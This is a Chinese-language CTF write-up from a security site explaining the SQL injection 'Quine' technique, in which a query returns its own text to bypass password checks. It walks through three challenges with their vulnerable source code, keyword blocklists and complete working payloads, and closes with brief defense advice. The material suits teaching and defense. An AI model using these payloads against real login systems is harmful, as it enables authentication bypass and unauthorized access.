# 从三道赛题再谈Quine trick

阅读量 **268126**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-14 15:30:02

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 0x00 前言

`Quine`本身不是一个非常新的考点了（最早可以追溯到2014年的`Codegate CTF
Finals`），但是他在实际利用中还存在很多细小的点，导致我们可能无法达到最后的效果，所以谨以此篇用三道比较典型的赛题重新梳理一下。

## 0x01 简介

`Quine`又叫做自产生程序，在`sql`注入技术中，这是一种使得输入的`sql`语句和输出的`sql`语句一致的技术，常用于一些特殊的登陆绕过`sql`注入中。

## 0x02 举例:yet_another_mysql_injection

第三届第五空间网络安全大赛的`yet_another_mysql_injection`赛题：

    
    
    function checkSql($s) {
        if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
            alertMes('hacker', 'index.php');
        }
    }
    
    if (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {
        $username=$_POST['username'];
        $password=$_POST['password'];
        if ($username !== 'admin') {
            alertMes('only admin can login', 'index.php');
        }
        checkSql($password);
        $sql="SELECT password FROM users WHERE username='admin' and password='$password';";
        $user_result=mysqli_query($con,$sql);
        $row = mysqli_fetch_array($user_result);
        if (!$row) {
            alertMes("something wrong",'index.php');
        }
        if ($row['password'] === $password) {
        die($FLAG);
        } else {
        alertMes("wrong password",'index.php');
      }
    }
    

上面`php`代码逻辑实现了一个通过`POST`提交登录请求的方法，要求`username`必须为`admin`，密码需要与查询到的`password`一致，才能拿到`flag`。

其实如果直接看这道题其实给出了所使用的`sql`语句，在语句中给出了表`user`，包括黑名单也在`checkSql`中都已经给出了，那么按理看这不是一个困难的注入，可以当成一个简单的盲注。通过使用`like`替换`=`，`benchmark`（或者其他笛卡儿积等）替换`sleep`，`mid`替换`substr`，`/**/`替换`Space`，使用如下`paload`即可完成：

    
    
    union select if((select ascii(mid((select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema like database()),{},1)) like {}),(select benchmark(4999999,md5('test'))),1)#
    

但是很遗憾，这样注出来`user`表中没有密码。

如果仔细看题目中这个比较判断的逻辑，我们就可以发现端倪。

    
    
    $sql="SELECT password FROM users WHERE username='admin' and password='$password';";
    $user_result=mysqli_query($con,$sql);
    $row = mysqli_fetch_array($user_result);
    
    if ($row['password'] === $password) {
        die($FLAG);
    

简单来看，要求的是执行`$sql`的结果与`$password`相同，那么除了正常逻辑的密码相同会产生相等，如果我们的输入与最后的结果相等，那么一样可以绕过验证。这种技术就是`Quine`。

###  0x021 从payload理解Quine

示例payload：

    
    
    union/**/SELECT/**/REPLACE(REPLACE('"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#',CHAR(34),CHAR(39)),CHAR(46),'"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#')/**/AS/**/ch3ns1r#
    

这样看起来不是很清楚，我们接下来从内层一步一步拆开看。

从大结构上，这段payload是由两个大REPLACE完成的

    
    
    REPLACE ( string_expression , string_pattern , string_replacement )
    即将string_expression中所有string_pattern替换为string_replacement
    

内层`REPLACE`：

    
    
    REPLACE('"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#',CHAR(34),CHAR(39))
    

我们暂且把它当作`A`，这里面有个字符串：

    
    
    "/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#
    

我们暂且把它当作`B`。

简化一下最初的`payload`就是这个样子：

    
    
    union/**/SELECT/**/REPLACE(A,CHAR(46),B)/**/AS/**/ch3ns1r#
    其中：
    A：REPLACE(B,CHAR(34),CHAR(39))
    B：
    "/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#
    

到这里应该就看的比较清楚了，有点像套娃。`A`这个形式就是`Quine`的基本形式，可以描述为如下形式：

    
    
    REPLACE(str,编码的间隔符,str)
    

`str`可描述为如下形式：

    
    
    REPLACE(间隔符,编码的间隔符,间隔符)
    

这样运算后，最后的结果又是：

    
    
    REPLACE(str,编码的间隔符,str)
    

我们举个例子加深理解，设间隔符为`'.'`，编码的间隔符为`CHAR(46)`，那么`str`为：

    
    
    REPLACE(".",CHAR(46),".")
    

放入最后的语句为：

    
    
    REPLACE('REPLACE(".",CHAR(46),".")',CHAR(46),'REPLACE(".",CHAR(46),".")')
    

执行的结果为（先执行的`CHAR(46)`）：

    
    
    REPLACE('REPLACE(".",CHAR(46),".")',CHAR(46),'REPLACE(".",CHAR(46),".")')
    

（注意以上的语句还没有考虑存在单双引号的情况）

这样就达到了输入与输出一致的效果。

    
    
     MySQL  localhost:3306 ssl  SQL > SELECT REPLACE('REPLACE(".",CHAR(46),".")',CHAR(46),'REPLACE(".",CHAR(46),".")');
    +---------------------------------------------------------------------------+
    | REPLACE('REPLACE(".",CHAR(46),".")',CHAR(46),'REPLACE(".",CHAR(46),".")') |
    +---------------------------------------------------------------------------+
    | REPLACE("REPLACE(".",CHAR(46),".")",CHAR(46),"REPLACE(".",CHAR(46),".")") |
    +---------------------------------------------------------------------------+
    1 row in set (0.0005 sec)
    

###  0x022 从解决单双引号理解Quine

细心点的话就会发现，这里还存在单双引号的问题，我们重新考虑存在单双引号的情况。

`Quine`的基本形式：

    
    
    REPLACE('str',编码的间隔符,'str')
    

`str`描述为如下形式：

    
    
    REPLACE("间隔符",编码的间隔符,"间隔符")
    

这里`str`中的间隔符使用双引号的原因是，`str`已经被单引号包裹，为避免引入新的转义符号，间隔符需要使用双引号。

运算后的结果是：

    
    
    REPLACE("str",编码的间隔符,"str")
    

但是我们希望`str`仍然使用单引号包裹，怎么办？

我们这样考虑，如果先使用`REPLACE`将`str`的双引号换成单引号，这样最后就不会出现引号不一致的情况了。

`Quine`的升级版基本形式：

    
    
    REPLACE(REPLACE('str',CHAR(34),CHAR(39)),编码的间隔符,'str')
    

`str`的升级版形式：

    
    
    REPLACE(REPLACE("间隔符",CHAR(34),CHAR(39)),编码的间隔符,"间隔符")
    

这里的`CHAR(34)`是双引号，`CHAR(39)`是单引号，如果`CHAR`被禁了`0x22`和`0x27`是一样的效果。

这里我们慢一点。

第一步：

    
    
    REPLACE(REPLACE("间隔符",CHAR(34),CHAR(39)),编码的间隔符,"间隔符")
    变成了
    REPLACE(REPLACE('间隔符',CHAR(34),CHAR(39)),编码的间隔符,'间隔符')
    

第二步：

    
    
    REPLACE('单引号str',编码的间隔符,'str')
    变成了
    REPLACE(REPLACE('str',CHAR(34),CHAR(39)),编码的间隔符,'str')
    

我们同样举刚才的例子，设间隔符为`'.'`，编码的间隔符为`CHAR(46)`，那么`str`为：

    
    
    REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")
    

放入最后的语句为：

    
    
    REPLACE(REPLACE('REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")',CHAR(34),CHAR(39)),CHAR(46),'REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")')
    

执行的结果为（先执行的内层`REPLACE`）：

    
    
    REPLACE(REPLACE('REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")',CHAR(34),CHAR(39)),CHAR(46),'REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")')
    

实际结果：

    
    
     MySQL  localhost:3306 ssl  SQL > SELECT REPLACE(REPLACE('REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")',CHAR(34),CHAR(39)),CHAR(46),'REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")');
    +------------------------------------------------------------------------------------------------------------------------------------------------------------+
    | REPLACE(REPLACE('REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")',CHAR(34),CHAR(39)),CHAR(46),'REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")') |
    +------------------------------------------------------------------------------------------------------------------------------------------------------------+
    | REPLACE(REPLACE('REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")',CHAR(34),CHAR(39)),CHAR(46),'REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")') |
    +------------------------------------------------------------------------------------------------------------------------------------------------------------+
    1 row in set (0.0004 sec)
    

现在就完全一致了。

###  0x023 从实际解题中理解Quine

我们现在重看这道题的payload：

    
    
    '/**/union/**/SELECT/**/REPLACE(REPLACE('"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#',CHAR(34),CHAR(39)),CHAR(46),'"/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#')/**/AS/**/ch3ns1r#
    

可能刚开始不太理解为什么内层`REPLACE`会存在不匹配的一个双引号，那么现在就容易理解了。

`str`为：

    
    
    "/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#
    

替换双引号为单引号：

    
    
    '/**/union/**/SELECT/**/REPLACE(REPLACE('.',CHAR(34),CHAR(39)),CHAR(46),'.')/**/AS/**/ch3ns1r#
    

这样就和我们注入的语言是一样了，前面那个不匹配的双引号被替换成了我们注入的单引号。

所以我们如果需要最后实际注入的话，比如加入union、空格，单引号等都需要对`str`进行添加。

## 0x03 拓展

###  0x031 Holyshield CTF

源码：

    
    
    <?php
    
    $query = "select cid,passcode from cage where cid='{$_GET[cid]}' and passcode='{$_GET[passcode]}'";
    if(!is_numeric($_GET['cid'])){
      echo "<center><h1>[cid] is only number.</h1></center>";
      exit();
    }
    
    if(preg_match('/cats|_|\.|rollup|join|@/i', $_GET['passcode'])) exit("<center><img src='sad.png' width='350px'><br></center>");
    
    $result = @mysqli_fetch_array(mysqli_query($conn,$query));
    
    if(($result['cid']) && ($result['passcode']) && ($result['cid'] == $_GET['passcode']) && ($result['passcode'] == 1337)){
      print_r($result)."<br>";
      $strtok = explode('cat',$result['cid']);
      $que = substr($strtok[0],-0x10);
      $query = "select secret from cats where name='{$que}'";
      $result = @mysqli_fetch_array(mysqli_query($conn,$query));
    
      if($result['secret']){
         echo "<center><h1>secret : {$result['secret']}</h1></center>";
      }
    }
    
    ?>
    

注意这里的逻辑：

    
    
    if(($result['cid']) && ($result['passcode']) && ($result['cid'] == $_GET['passcode']) && ($result['passcode'] == 1337))
    

这道赛题当时`cage`表中没有任何数据，我们要进入这个if又必须使得`cid`和`passcode`能够有返回，更关键的是，我们需要让查询到的`cid`和我们输入`passcode`的一致，且最后查询到的`passcode`要和`1337`相等，怎么办？

最后一个是最简单的我们只需要让`1337`在语句中成为`passcode`就可以。

    
    
     SQL > Select 1337 AS passcode;
    +----------+
    | passcode |
    +----------+
    |     1337 |
    +----------+
    1 row in set (0.0006 sec)
    

而查询到的`cid`和我们输入的`passcode`一致，这其实跟我们上面提到的赛题是异曲同工，因此我们只需要在`passcode`使用`Quine`技术，并让结果成为`cid`即可。

payload：

    
    
    ' UNION SELECT REPLACE(REPLACE('" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS cid, 1337 AS passcode -- "OR 1 limit 3,1#',CHAR(34),CHAR(39)),CHAR(36),'" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS cid, 1337 AS passcode -- "OR 1 limit 3,1#') AS cid, 1337 AS passcode -- 'OR 1 limit 3,1#
    

注意，这里的`str`是：

    
    
    " UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS cid, 1337 AS passcode -- "OR 1 limit 3,1#
    

开头的双引号不多说，跟我们上面分析的一样，这里使用`$`也是没问题的，后面相应变化就可以，`cid`和`passcode`的变化对于`str`也需要加上，最后的`OR
1 limit 3,1`是什么意思，大家可以思考一下。

###  0x032 2021qwb Quals easy_sql

源码：

    
    
    const salt = random('Aa0', 40);
    const HashCheck = sha256(sha256(salt + 'admin')).toString();
    
    let filter = (data) => {
        let blackwords = ['alter', 'insert', 'drop', 'delete', 'update', 'convert', 'chr', 'char', 'concat', 'reg', 'to', 'query'];
        let flag = false;
    
        if (typeof data !== 'string') return true;
    
        blackwords.forEach((value, idx) => {
            if (data.includes(value)) {
                console.log(`filter: ${value}`);
                return (flag = true);
            }
        });
    
        let limitwords = ['substring', 'left', 'right', 'if', 'case', 'sleep', 'replace', 'as', 'format', 'union'];
        limitwords.forEach((value, idx) => {
            if (count(data, value) > 3){
                console.log(`limit: ${value}`);
                return (flag = true);
            }
        });
    
        return flag;
    }
    app.get('/source', async (req, res, next) => {
        fs.readFile('./source.txt', 'utf8', (err, data) => {
            if (err) {
                res.send(err);
            }
            else {
                res.send(data);
            }
        });
    });
    
    app.all('/', async (req, res, next) => {
        if (req.method == 'POST') {
            if (req.body.username && req.body.password) {
                let username = req.body.username.toLowerCase();
                let password = req.body.password.toLowerCase();
    
                if (username === 'admin') {
                    res.send(`<script>alert("Don't want this!!!");location.href='/';</script>`);
                    return;
                }
    
                UserHash = sha256(sha256(salt + username)).toString();
                if (UserHash !== HashCheck) {
                    res.send(`<script>alert("NoNoNo~~~You are not admin!!!");location.href='/';</script>`);
                    return;
                }
    
                if (filter(password)) {
                    res.send(`<script>alert("Hacker!!!");location.href='/';</script>`);
                    return;
                }
    
                let sql = `select password,username from users where username='${username}' and password='${password}';`;
                client.query(sql, [], (err, data) => {
                    if (err) {
                        res.send(`<script>alert("Something Error!");location.href='/';</script>`);
                        return;
                    }
                    else {
                        if ((typeof data !== 'undefined') && (typeof data.rows[0] !== 'undefined') && (data.rows[0].password === password)) {
                            res.send(`<script>alert("Congratulation,here is your flag:${flag}");location.href='/';</script>`);
                            return;
                        }
                        else {
                            res.send(`<script>alert("Password Error!!!");location.href='/';</script>`);
                            return;
                        }
                    }
                });
            }
        }
    
        res.render('index');
        return;
    });
    

这个题目的具体解法安全客就有，大家有兴趣可以移步去看，我们只关注`Quine`部分。

注意这里的逻辑

    
    
    if ((typeof data !== 'undefined') && (typeof data.rows[0] !== 'undefined') && (data.rows[0].password === password)) {
                            res.send(`<script>alert("Congratulation,here is your flag:${flag}");location.href='/';</script>`);
                            return;
    

其实这里就是典型的`Quine`，只不过这道题的数据库是`pgsql`，而且`REPLACE`函数被禁了。值得注意的是，`pgsql`下的`current_query`是可以获取当前执行的语句的，长亭的WP中似乎想要使用这种方法，但是没能成功，最后他们使用了堆叠注入并引入语法错误抵消`query`在`commit`后为空的情况。另外看了几个强队的WP也是这种解法。

有一种[解法](https://www.anquanke.com/post/id/244156#h3-7)值得注意，看起来似乎使用了使用了`Quine`进行盲注，但其实思考过就会明白这道题只需要构造一个合理的`Quine`即可，不需要盲注。

这个脚本中`for`循环是没什么用的，实际有用的`payload`是：

    
    
    ' union SELECT REPLACE(translate('" union SELECT REPLACE(translate(".",(select substr((select hint from hint),6,1)),(select substr((select hint from hint),3,1))),(select substr((select version()),14,1)),".") AS dem0-- ',(select substr((select hint from hint),6,1)),(select substr((select hint from hint),3,1))),(select substr((select version()),14,1)),'" union SELECT REPLACE(translate(".",(select substr((select hint from hint),6,1)),(select substr((select hint from hint),3,1))),(select substr((select version()),14,1)),".") AS dem0-- ') AS dem0--    

这说明了，`translate`也是可以代理`replace`的，这也给我们提供了新的思路。（只不过没想懂为什么有这么多`select hint from
hint`）

## 0x04 可行的防御措施

`Quine`本身是个很危险的技术，对于开发人员而言题目中出现的逻辑并不鲜见，可行的防御方法是将`REPLACE`、`TRANSLATE`等函数也纳入黑名单，同时对查询获取到的结果做正则匹配，这样就可以一定程度防御`Quine`的攻击。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ch3ns1r** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/253570](/post/id/253570)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [SQL注入](/tag/SQL注入)
  * [Quine技术](/tag/Quine技术)

 **+1** __8赞

 __收藏

![](https://p4.ssl.qhimg.com/t01a061b22a284d498e.png) ch3ns1r

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

